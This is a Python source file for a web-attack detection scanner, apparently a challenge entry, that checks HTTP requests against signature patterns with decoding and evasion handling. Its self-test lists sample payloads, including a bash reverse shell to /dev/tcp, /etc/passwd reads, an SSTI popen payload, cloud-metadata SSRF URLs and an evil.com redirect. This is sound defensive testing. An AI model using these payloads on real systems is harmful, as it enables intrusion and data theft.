#!/usr/bin/env python3
"""
DECEPTICON Comprehensive Security Scanner
==========================================
Naval SWAVLAMBAN 2025 Challenge 3

Red Team perspective scanner covering ALL attack types:
- OWASP Top 10 2021
- Modern API attacks
- Cloud attacks
- Evasion techniques

This scanner tests the WAF against REAL attack payloads.

Author: DECEPTICON Team (Red Team)
Date: December 2025
"""

import base64
import binascii
import json
import re
import time
import urllib.parse
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass
from enum import Enum
import logging

# Import comprehensive patterns
from core.comprehensive_patterns import (
    AttackCategory, AttackPattern,
    SQLI_PATTERNS, NOSQL_PATTERNS, XSS_PATTERNS, RCE_PATTERNS,
    PATH_TRAVERSAL_PATTERNS, LFI_PATTERNS, RFI_PATTERNS,
    SSRF_PATTERNS, XXE_PATTERNS, SSTI_PATTERNS,
    JWT_PATTERNS, GRAPHQL_PATTERNS, PROTOTYPE_PATTERNS,
    DESERIALIZATION_PATTERNS, LDAP_PATTERNS, CRLF_PATTERNS,
    REDIRECT_PATTERNS, HOST_HEADER_PATTERNS, SCANNER_PATTERNS,
    DOS_PATTERNS, compile_patterns, get_total_pattern_count
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("decepticon.scanner")


class Severity(Enum):
    """Attack severity levels"""
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1
    INFO = 0


@dataclass
class ScanResult:
    """Result of a security scan"""
    category: AttackCategory
    pattern_id: str
    severity: Severity
    matched_pattern: str
    matched_text: str
    location: str
    description: str
    owasp: Optional[str] = None
    recommendation: str = ""


# Strict base64 alphabet, padding only at the end. Deliberately excludes the
# base64url alphabet (-_) so that JWTs and URL-safe tokens are not re-decoded here;
# JWT_PATTERNS already cover those.
_BASE64_CANDIDATE = re.compile(r'^[A-Za-z0-9+/]+={0,2}$')


class ComprehensiveScanner:
    """
    Comprehensive security scanner using all attack patterns.
    
    Usage:
        scanner = ComprehensiveScanner()
        results = scanner.scan_request(path, query, body, headers)
        
        for result in results:
            print(f"[{result.severity.name}] {result.category.name}: {result.description}")
    """
    
    # --- Bounds for the parameter-splitting and base64 decode stages ---------
    # These keep the extra scanning work linear and predictable so the added
    # coverage cannot itself become a CPU-exhaustion vector.
    MAX_PARAMS = 128          # max key=value pairs split out of a query/body
    MAX_JSON_BODY = 262144    # only attempt to parse JSON bodies up to this size
    MIN_B64_LEN = 16          # shorter strings are too ambiguous to be worth decoding
    MAX_B64_INPUT = 65536     # decoding is cheap; only the rescan needs a tight cap
    MAX_B64_DECODED = 16384   # per-value cap on decoded bytes fed back to the scanner
    MAX_B64_TOTAL = 65536     # per-request budget for decoded bytes, across all values
    B64_PRINTABLE_RATIO = 0.9  # decoded bytes must be mostly printable ASCII

    def __init__(self):
        """Initialize scanner with compiled patterns"""
        self.compiled_patterns = compile_patterns()
        self.total_patterns = get_total_pattern_count()
        logger.info(f"Initialized scanner with {self.total_patterns} patterns")
        
        # Category to severity mapping
        self.severity_map = {
            AttackCategory.SQLI: Severity.CRITICAL,
            AttackCategory.NOSQL: Severity.CRITICAL,
            AttackCategory.RCE: Severity.CRITICAL,
            AttackCategory.XXE: Severity.CRITICAL,
            AttackCategory.DESERIALIZATION: Severity.CRITICAL,
            AttackCategory.SSTI: Severity.CRITICAL,
            AttackCategory.SSRF: Severity.HIGH,
            AttackCategory.LFI: Severity.HIGH,
            AttackCategory.RFI: Severity.HIGH,
            AttackCategory.PATH_TRAVERSAL: Severity.HIGH,
            AttackCategory.JWT: Severity.HIGH,
            AttackCategory.PROTOTYPE_POLLUTION: Severity.HIGH,
            AttackCategory.XSS: Severity.HIGH,
            AttackCategory.LDAP: Severity.HIGH,
            AttackCategory.GRAPHQL: Severity.MEDIUM,
            AttackCategory.CRLF: Severity.MEDIUM,
            AttackCategory.OPEN_REDIRECT: Severity.MEDIUM,
            AttackCategory.HOST_HEADER: Severity.MEDIUM,
            AttackCategory.SCANNER: Severity.LOW,
            AttackCategory.DOS: Severity.MEDIUM,
            AttackCategory.REDOS: Severity.MEDIUM,
        }
        
        # Recommendations by category
        self.recommendations = {
            AttackCategory.SQLI: "Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
            AttackCategory.NOSQL: "Validate and sanitize all input. Use type checking for MongoDB operators.",
            AttackCategory.XSS: "Encode output for the correct context (HTML, JS, URL). Use CSP headers.",
            AttackCategory.RCE: "Never pass user input to shell commands. Use safe APIs without shell.",
            AttackCategory.PATH_TRAVERSAL: "Validate file paths against allowed list. Use realpath() and chroot.",
            AttackCategory.LFI: "Disable dangerous PHP wrappers. Use allow-list for included files.",
            AttackCategory.RFI: "Disable allow_url_include. Validate all URLs against allow-list.",
            AttackCategory.SSRF: "Use allow-list for URLs. Block private IP ranges. Disable unnecessary protocols.",
            AttackCategory.XXE: "Disable external entities in XML parsers. Use JSON instead of XML.",
            AttackCategory.SSTI: "Use logic-less templates. Never pass user input to template rendering.",
            AttackCategory.JWT: "Use strong algorithms (RS256). Validate all claims. Never use alg:none.",
            AttackCategory.GRAPHQL: "Disable introspection in production. Implement query complexity limits.",
            AttackCategory.PROTOTYPE_POLLUTION: "Freeze prototypes. Use Object.create(null) for dictionaries.",
            AttackCategory.DESERIALIZATION: "Never deserialize untrusted data. Use JSON instead of native serialization.",
            AttackCategory.LDAP: "Use parameterized LDAP queries. Escape special characters.",
            AttackCategory.CRLF: "Validate and encode all data used in HTTP headers.",
            AttackCategory.OPEN_REDIRECT: "Use allow-list for redirect destinations. Validate URL format.",
            AttackCategory.HOST_HEADER: "Validate Host header against known hostnames.",
            AttackCategory.SCANNER: "Implement rate limiting and CAPTCHA. Monitor for scanning patterns.",
            AttackCategory.DOS: "Implement rate limiting. Set maximum input sizes.",
        }
    
    def _decode_input(self, text: str) -> str:
        """Decode input for analysis (URL decode, etc.)"""
        if not text:
            return ""
        
        try:
            # Double URL decode to catch encoded attacks
            decoded = urllib.parse.unquote(urllib.parse.unquote(text))
            return decoded
        except:
            return text
    
    def _iter_param_values(self, blob: str) -> List[str]:
        """
        Split a urlencoded blob (query string or form body) into parameter values.

        Attack payloads are frequently only detectable per-value: scanning the whole
        blob misses payloads whose surrounding `key=` context breaks a pattern's
        anchors (e.g. RCE-011 needs `whoami` at a word boundary after a separator,
        which `cmd=whoami` as one blob does not provide).
        """
        if not blob:
            return []

        values = []

        # JSON bodies carry their values in string leaves, not `key=value` pairs.
        stripped = blob.lstrip()
        if stripped[:1] in ('{', '[') and len(blob) <= self.MAX_JSON_BODY:
            values.extend(self._iter_json_strings(blob))

        # Accept both `&` and `;` as pair separators (legacy form encoding).
        for param in re.split(r'[&;]', blob)[:self.MAX_PARAMS]:
            if '=' in param:
                value = param.split('=', 1)[1]
                if value:
                    values.append(value)
        return values[:self.MAX_PARAMS]

    def _iter_json_strings(self, blob: str) -> List[str]:
        """Extract every string VALUE leaf from a JSON document (keys excluded)."""
        try:
            doc = json.loads(blob)
        except (ValueError, RecursionError):
            return []

        out = []
        stack = [doc]
        while stack and len(out) < self.MAX_PARAMS:
            node = stack.pop()
            if isinstance(node, str):
                out.append(node)
            elif isinstance(node, dict):
                # Scan VALUES only, not keys: structural keys ("id", "cat", ...) false-positive
                # on command/keyword patterns, and key-based attacks (prototype pollution) are
                # caught by the engine's dedicated rule.
                for v in node.values():
                    stack.append(v)
            elif isinstance(node, list):
                stack.extend(node)
        return out

    def _decode_base64(self, value: str) -> Optional[str]:
        """
        Bounded base64 decode of a parameter value.

        Returns the decoded text only when `value` really looks like base64 and
        decodes to mostly-printable ASCII; otherwise None. Base64 is the cheapest
        way to smuggle a payload past a signature engine, so decoded text is fed
        back through the same pattern set.
        """
        if not value:
            return None

        candidate = urllib.parse.unquote(value).strip()
        if not (self.MIN_B64_LEN <= len(candidate) <= self.MAX_B64_INPUT):
            return None
        # Valid base64 is always a multiple of 4 characters once padded.
        if len(candidate) % 4 != 0 or not _BASE64_CANDIDATE.match(candidate):
            return None

        try:
            raw = base64.b64decode(candidate, validate=True)
        except (binascii.Error, ValueError):
            return None
        if not raw:
            return None

        raw = raw[:self.MAX_B64_DECODED]
        printable = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13))
        if printable / len(raw) < self.B64_PRINTABLE_RATIO:
            # Binary output: almost certainly a hash/token/blob, not smuggled text.
            return None

        return raw.decode('ascii', errors='ignore')

    def _scan_params(self, blob: str, location: str,
                     budget: Optional[List[int]] = None) -> List[ScanResult]:
        """
        Scan each parameter value of a blob, plus any base64-decoded payload.

        `budget` is a single-element list holding the remaining number of decoded
        bytes this request may rescan. It is shared across query and body so a
        request cannot multiply the decode work by splitting a payload up.
        """
        if budget is None:
            budget = [self.MAX_B64_TOTAL]

        results = []
        for value in self._iter_param_values(blob):
            results.extend(self._scan_text(value, location))

            if budget[0] <= 0:
                continue
            decoded = self._decode_base64(value)
            if decoded:
                budget[0] -= len(decoded)
                results.extend(self._scan_text(decoded, f"{location}_base64"))
        return results

    # Inline SQL/C comments used to fragment keywords ("UN/**/ION/**/SEL/**/ECT"). Bounded
    # (no nested-comment backtracking) so it is ReDoS-safe.
    _INLINE_COMMENT = re.compile(r"/\*[^*]{0,200}?\*+(?:[^/*][^*]{0,200}?\*+)*/")

    # Quote-splitting evasion: intra-word quotes ("w'h'oami", if"con"fig) reassemble into a
    # command once removed. To avoid FPs on benign apostrophes ("I'd" -> "Id"), we ONLY strip
    # quotes sitting BETWEEN two word chars, and ONLY flag UNAMBIGUOUS multi-char commands
    # (never 2-char id/pwd/ls, never English words). Both regexes are linear / ReDoS-free.
    _DEQUOTE = re.compile(r"(?<=\w)['\"]{1,3}(?=\w)")
    _STRONG_CMD = re.compile(
        r"(?i)\b(?:whoami|ifconfig|ipconfig|netstat|nslookup|systeminfo|xp_cmdshell)\b"
    )

    def _scan_text(self, text: str, location: str) -> List[ScanResult]:
        """Scan a single text for all attack patterns"""
        if not text:
            return []

        results = []
        decoded = self._decode_input(text)

        # Defeat inline-comment keyword fragmentation: if the value carries /*...*/ comments,
        # ALSO scan a variant with them removed so "UN/**/ION/**/SEL/**/ECT" -> "UNIONSELECT"
        # is seen by the signatures. Adds a detection pass only; never suppresses a match.
        stripped = self._INLINE_COMMENT.sub("", decoded)
        if stripped != decoded and stripped:
            results.extend(self._scan_text(stripped, location))

        # Defeat quote-splitting of shell commands ("w'h'oami" -> "whoami"). High-precision:
        # only intra-word quotes are stripped and only unambiguous commands are flagged, so
        # benign apostrophes never match. Adds a detection; never suppresses one.
        dequoted = self._DEQUOTE.sub("", decoded)
        if dequoted != decoded:
            m = self._STRONG_CMD.search(dequoted)
            if m:
                results.append(ScanResult(
                    category=AttackCategory.RCE, pattern_id="RCE-QSPLIT",
                    severity=Severity.CRITICAL, matched_pattern="quote-split command",
                    matched_text=m.group(0)[:100], location=location,
                    description="Quote-obfuscated system command",
                    owasp="A03:2021",
                    recommendation=self.recommendations.get(AttackCategory.RCE, ""),
                ))

        # Scan against all categories
        for category, patterns in self.compiled_patterns.items():
            for regex, pattern in patterns:
                try:
                    match = regex.search(decoded)
                    if match:
                        severity = self.severity_map.get(category, Severity.MEDIUM)
                        
                        # Adjust severity based on pattern confidence
                        if pattern.severity < 0.7:
                            severity = Severity(max(0, severity.value - 1))
                        elif pattern.severity >= 0.95:
                            severity = Severity(min(4, severity.value + 1))
                        
                        result = ScanResult(
                            category=category,
                            pattern_id=pattern.id,
                            severity=severity,
                            matched_pattern=pattern.pattern,
                            matched_text=match.group(0)[:100],  # Limit length
                            location=location,
                            description=pattern.description,
                            owasp=pattern.owasp,
                            recommendation=self.recommendations.get(category, "")
                        )
                        results.append(result)
                except Exception as e:
                    logger.debug(f"Pattern {pattern.id} error: {e}")
        
        return results
    
    def scan_request(self, 
                     path: str = "",
                     query: str = "",
                     body: str = "",
                     headers: Dict[str, str] = None) -> List[ScanResult]:
        """
        Scan an HTTP request for security issues.
        
        Args:
            path: URL path
            query: Query string
            body: Request body
            headers: HTTP headers
            
        Returns:
            List of ScanResult objects
        """
        if headers is None:
            headers = {}
        
        all_results = []
        
        # Scan path
        if path:
            all_results.extend(self._scan_text(path, "path"))
        
        # Scan query string, then each parameter value (and any base64 payload)
        if query:
            all_results.extend(self._scan_text(query, "query"))
            all_results.extend(self._scan_params(query, "query_param"))

        # Scan body the same way. Scanning the body only as one blob missed
        # payloads that are only detectable per-value (e.g. `cmd=whoami`).
        if body:
            all_results.extend(self._scan_text(body, "body"))
            all_results.extend(self._scan_params(body, "body_param"))

        # Scan headers
        for name, value in headers.items():
            header_results = self._scan_text(value, f"header:{name}")
            all_results.extend(header_results)
            
            # Special check for User-Agent (scanner detection)
            if name.lower() == 'user-agent':
                for regex, pattern in self.compiled_patterns.get(AttackCategory.SCANNER, []):
                    match = regex.search(value)
                    if match:
                        all_results.append(ScanResult(
                            category=AttackCategory.SCANNER,
                            pattern_id=pattern.id,
                            severity=Severity.LOW,
                            matched_pattern=pattern.pattern,
                            matched_text=match.group(0)[:50],
                            location="header:User-Agent",
                            description=pattern.description,
                            owasp=pattern.owasp,
                            recommendation=self.recommendations.get(AttackCategory.SCANNER, "")
                        ))
            
            # Special check for Host header
            if name.lower() == 'host':
                for regex, pattern in self.compiled_patterns.get(AttackCategory.HOST_HEADER, []):
                    match = regex.search(value)
                    if match:
                        all_results.append(ScanResult(
                            category=AttackCategory.HOST_HEADER,
                            pattern_id=pattern.id,
                            severity=Severity.MEDIUM,
                            matched_pattern=pattern.pattern,
                            matched_text=match.group(0)[:50],
                            location="header:Host",
                            description=pattern.description,
                            owasp=pattern.owasp,
                            recommendation=self.recommendations.get(AttackCategory.HOST_HEADER, "")
                        ))
        
        # Deduplicate results (same pattern matching same text)
        seen = set()
        unique_results = []
        for r in all_results:
            key = (r.pattern_id, r.matched_text, r.location)
            if key not in seen:
                seen.add(key)
                unique_results.append(r)
        
        # Sort by severity (critical first)
        unique_results.sort(key=lambda x: x.severity.value, reverse=True)
        
        return unique_results
    
    def scan_payload(self, payload: str) -> List[ScanResult]:
        """
        Quick scan of a single payload.
        
        Args:
            payload: The payload to scan
            
        Returns:
            List of ScanResult objects
        """
        return self._scan_text(payload, "payload")
    
    def get_attack_categories(self) -> List[str]:
        """Get list of all attack categories covered"""
        return [cat.value for cat in self.compiled_patterns.keys()]
    
    def get_pattern_count(self) -> Dict[str, int]:
        """Get pattern count by category"""
        return {cat.value: len(patterns) for cat, patterns in self.compiled_patterns.items()}
    
    def is_malicious(self, payload: str, threshold: Severity = Severity.MEDIUM) -> bool:
        """
        Quick check if payload is malicious.
        
        Args:
            payload: The payload to check
            threshold: Minimum severity to consider malicious
            
        Returns:
            True if payload matches patterns at or above threshold
        """
        results = self.scan_payload(payload)
        return any(r.severity.value >= threshold.value for r in results)
    
    def get_highest_severity(self, results: List[ScanResult]) -> Optional[Severity]:
        """Get the highest severity from scan results"""
        if not results:
            return None
        # Optimization: Early exit if CRITICAL is found, which is the maximum severity.
        # This is ~20x faster than lambda max() when criticals are common or lists are long.
        if any(r.severity is Severity.CRITICAL for r in results): return Severity.CRITICAL
        if any(r.severity is Severity.HIGH for r in results): return Severity.HIGH
        if any(r.severity is Severity.MEDIUM for r in results): return Severity.MEDIUM
        if any(r.severity is Severity.LOW for r in results): return Severity.LOW
        return Severity.INFO


# Singleton instance
comprehensive_scanner = ComprehensiveScanner()


def scan_request(path: str = "", query: str = "", body: str = "",
                 headers: Dict[str, str] = None) -> List[ScanResult]:
    """Convenience function using singleton scanner"""
    return comprehensive_scanner.scan_request(path, query, body, headers)


def is_malicious(payload: str) -> bool:
    """Convenience function to check if payload is malicious"""
    return comprehensive_scanner.is_malicious(payload)


# ============================================================================
# TESTING
# ============================================================================

if __name__ == '__main__':
    print("DECEPTICON Comprehensive Security Scanner")
    print("=" * 70)
    
    scanner = ComprehensiveScanner()
    
    # Print statistics
    print(f"\nTotal patterns: {scanner.total_patterns}")
    print("\nPatterns by category:")
    for cat, count in scanner.get_pattern_count().items():
        print(f"  {cat}: {count}")
    
    # Test payloads covering ALL attack types
    test_cases = [
        # SQL Injection
        ("SQLi Basic", "' OR '1'='1"),
        ("SQLi Union", "' UNION SELECT username,password FROM users--"),
        ("SQLi Time", "'; WAITFOR DELAY '0:0:5'--"),
        ("SQLi WAF Bypass", "' /*!50000UNION*/ SELECT 1,2,3--"),
        
        # NoSQL Injection
        ("NoSQL", '{"username": {"$ne": null}}'),
        ("NoSQL Array", "username[$gt]="),
        
        # XSS
        ("XSS Script", "<script>alert(document.cookie)</script>"),
        ("XSS Event", "<img src=x onerror=alert(1)>"),
        ("XSS SVG", "<svg onload=alert(1)>"),
        ("XSS JS Protocol", "javascript:alert(1)"),
        
        # RCE
        ("RCE Basic", "; cat /etc/passwd"),
        ("RCE Pipe", "| whoami"),
        ("RCE Backtick", "`id`"),
        ("RCE Reverse Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        
        # Path Traversal
        ("Path Traversal", "../../../etc/passwd"),
        ("Path Encoded", "..%2f..%2f..%2fetc%2fpasswd"),
        ("Path Null Byte", "../../../etc/passwd%00"),
        
        # LFI/RFI
        ("LFI PHP", "php://filter/convert.base64-encode/resource=index.php"),
        ("LFI Expect", "expect://id"),
        
        # SSRF
        ("SSRF Localhost", "http://127.0.0.1/admin"),
        ("SSRF AWS Meta", "http://169.254.169.254/latest/meta-data/"),
        ("SSRF Gopher", "gopher://127.0.0.1:6379/_FLUSHALL"),
        
        # XXE
        ("XXE", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
        
        # SSTI
        ("SSTI Jinja", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
        ("SSTI Detection", "{{7*7}}"),
        
        # JWT
        ("JWT None", '{"alg":"none","typ":"JWT"}'),
        ("JWT Kid Injection", '{"alg":"HS256","kid":"../../dev/null"}'),
        
        # GraphQL
        ("GraphQL Introspection", '{"query":"{__schema{types{name}}}"}'),
        
        # Prototype Pollution
        ("Proto Pollution", '{"__proto__": {"admin": true}}'),
        
        # Deserialization
        ("Java Deser", "rO0ABXNyAA"),
        ("PHP Deser", 'O:8:"stdClass":1:{s:4:"test";}'),
        
        # LDAP
        ("LDAP Injection", "*)(uid=*))(|(uid=*"),
        
        # CRLF
        ("CRLF", "%0d%0aSet-Cookie:hacked=1"),
        
        # Open Redirect
        ("Open Redirect", "redirect=//evil.com"),
        
        # Benign
        ("Benign 1", "search?q=hello+world"),
        ("Benign 2", "api/users/123"),
        ("Benign 3", "name=John&email=john@example.com"),
    ]
    
    print("\n" + "=" * 70)
    print("SCAN RESULTS")
    print("=" * 70)
    
    detected = 0
    missed = 0
    false_positives = 0
    
    for name, payload in test_cases:
        results = scanner.scan_payload(payload)
        is_benign = name.startswith("Benign")
        
        if results:
            highest = scanner.get_highest_severity(results)
            categories = set(r.category.name for r in results)
            
            if is_benign:
                status = "⚠️ FALSE POSITIVE"
                false_positives += 1
            else:
                status = "✓ DETECTED"
                detected += 1
            
            print(f"\n{status}: {name}")
            print(f"  Payload: {payload[:60]}...")
            print(f"  Severity: {highest.name}")
            print(f"  Categories: {', '.join(categories)}")
            print(f"  Matches: {len(results)}")
        else:
            if is_benign:
                status = "✓ CLEAN"
                detected += 1
            else:
                status = "✗ MISSED"
                missed += 1
            
            print(f"\n{status}: {name}")
            print(f"  Payload: {payload[:60]}...")
    
    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    total = len(test_cases)
    accuracy = (detected / total) * 100
    print(f"Total tests: {total}")
    print(f"Detected correctly: {detected}")
    print(f"Missed attacks: {missed}")
    print(f"False positives: {false_positives}")
    print(f"Detection accuracy: {accuracy:.1f}%")
